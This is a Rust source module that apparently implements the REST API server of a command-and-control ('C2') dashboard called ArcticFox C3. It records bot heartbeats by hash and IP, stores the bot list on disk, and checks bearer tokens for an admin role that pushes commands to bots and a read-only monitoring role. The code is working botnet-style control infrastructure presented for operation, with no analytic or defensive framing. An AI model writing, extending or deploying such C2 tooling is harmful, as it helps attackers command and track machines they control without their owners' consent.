//! ArcticFox C3 API Server
//!
//! Axum-based REST API for the C2 dashboard.
//! Two roles:
//!   - admin: Full C2 control (push commands, manage repos, tokens, heartbeat)
//!   - lints: Read-only monitoring (view bots, repos, commands, status)
//!
//! Auth via Bearer token in Authorization header.
//! Heartbeat receiver is unauthenticated.

pub mod routes_admin;
pub mod routes_lints;

use std::collections::HashMap;
use std::time::{Duration, Instant};
use tokio::sync::RwLock;
use tracing::{info, warn};

use arcticfox_core::config::{ApiConfig, ControlConfig};
use arcticfox_core::crypto::constant_time_str_eq;
use arcticfox_core::error::{ArcticFoxError, Result};
use arcticfox_core::repo;

// ── App State ───────────────────────────────────────────────────────────────

/// Shared application state.
pub struct AppState {
    pub api_config: RwLock<ApiConfig>,
    pub control_config: RwLock<ControlConfig>,
    pub bots: RwLock<HashMap<String, BotInfo>>,
    pub bots_last_save: RwLock<Instant>,
    pub http_client: reqwest::Client,
    bots_path: std::path::PathBuf,
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct BotInfo {
    pub ip: String,
    pub first_seen: f64,
    pub last_seen: f64,
    pub hits: u64,
}

const BOTS_SAVE_INTERVAL: Duration = Duration::from_secs(10);
pub const BOT_ALIVE_THRESHOLD: f64 = 600.0; // 10 minutes

impl AppState {
    pub fn new(api_config: ApiConfig, control_config: ControlConfig, bots_path: std::path::PathBuf) -> Result<Self> {
        let http_client = repo::build_client()?;
        Ok(AppState {
            api_config: RwLock::new(api_config),
            control_config: RwLock::new(control_config),
            bots: RwLock::new(HashMap::new()),
            bots_last_save: RwLock::new(Instant::now()),
            http_client,
            bots_path,
        })
    }

    /// Load bots from disk.
    pub async fn load_bots(&self, path: &std::path::Path) {
        if path.exists() {
            match std::fs::read_to_string(path) {
                Ok(content) => {
                    if let Ok(bots) = serde_json::from_str::<HashMap<String, BotInfo>>(&content) {
                        *self.bots.write().await = bots;
                        info!("Loaded {} bots from disk", self.bots.read().await.len());
                    }
                }
                Err(e) => warn!("Could not read bots file: {e}"),
            }
        }
    }

    /// Record a bot heartbeat.
    pub async fn record_heartbeat(&self, bot_hash: &str, ip: &str) {
        let now = chrono::Utc::now().timestamp() as f64;
        let mut bots = self.bots.write().await;

        let entry = bots.entry(bot_hash.to_string()).or_insert_with(|| BotInfo {
            ip: ip.to_string(),
            first_seen: now,
            last_seen: now,
            hits: 0,
        });

        entry.last_seen = now;
        entry.hits = entry.hits.saturating_add(1);
        entry.ip = ip.to_string(); // Update IP if it changed

        // Check bot limit
        if bots.len() > 10_000 {
            // Remove the 1000 oldest bots
            let mut sorted: Vec<(&String, &BotInfo)> = bots.iter().collect();
            sorted.sort_by(|a, b| a.1.last_seen.partial_cmp(&b.1.last_seen).unwrap());
            let to_remove: Vec<String> = sorted.iter().take(1000).map(|(k, _)| (*k).clone()).collect();
            for k in &to_remove {
                bots.remove(k);
            }
        }

        // Throttled save — prevent concurrent saves by taking timestamp early
        let mut last_save = self.bots_last_save.write().await;
        if last_save.elapsed() >= BOTS_SAVE_INTERVAL {
            *last_save = Instant::now(); // block concurrent saves
            drop(last_save);
            drop(bots); // release bots lock before disk I/O
            if let Err(e) = self.save_bots().await {
                warn!("Failed to save bots: {e}");
            }
        }
    }

    /// Save bots to disk atomically.
    async fn save_bots(&self) -> Result<()> {
        let data = {
            let bots = self.bots.read().await;
            serde_json::to_string_pretty(&*bots).map_err(|e| ArcticFoxError::Json {
                source: e,
            })?
        };

        let path = &self.bots_path;
        let tmp = path.with_extension("tmp");
        std::fs::write(&tmp, &data).map_err(|e| ArcticFoxError::FileWrite {
            path: tmp.clone(),
            source: e,
        })?;
        std::fs::rename(&tmp, path).map_err(|e| ArcticFoxError::AtomicReplace {
            path: path.to_path_buf(),
            source: e,
        })?;

        *self.bots_last_save.write().await = Instant::now();
        Ok(())
    }
}

// ── Auth Layer ──────────────────────────────────────────────────────────────

#[derive(Debug, Clone, PartialEq)]
pub enum Role {
    Admin,
    Lints,
}

/// Extract and validate Bearer token, returning the user's role.
pub async fn authenticate(
    state: &AppState,
    auth_header: Option<&str>,
) -> std::result::Result<Role, ArcticFoxError> {
    let token = auth_header
        .and_then(|h| h.strip_prefix("Bearer "))
        .ok_or(ArcticFoxError::MissingToken)?;

    let api_config = state.api_config.read().await;

    if constant_time_str_eq(token, &api_config.admin_token) {
        return Ok(Role::Admin);
    }

    if constant_time_str_eq(token, &api_config.lints_token) {
        return Ok(Role::Lints);
    }

    Err(ArcticFoxError::Auth {
        reason: "Invalid token".into(),
    })
}

// ── Response Helpers ────────────────────────────────────────────────────────

pub fn json_ok<T: serde::Serialize>(data: T) -> axum::Json<serde_json::Value> {
    axum::Json(serde_json::to_value(data).unwrap_or(serde_json::json!({"error": "serialization failed"})))
}

pub fn json_err(msg: &str, code: u16) -> (axum::http::StatusCode, axum::Json<serde_json::Value>) {
    (
        axum::http::StatusCode::from_u16(code).unwrap_or(axum::http::StatusCode::INTERNAL_SERVER_ERROR),
        axum::Json(serde_json::json!({"error": msg})),
    )
}
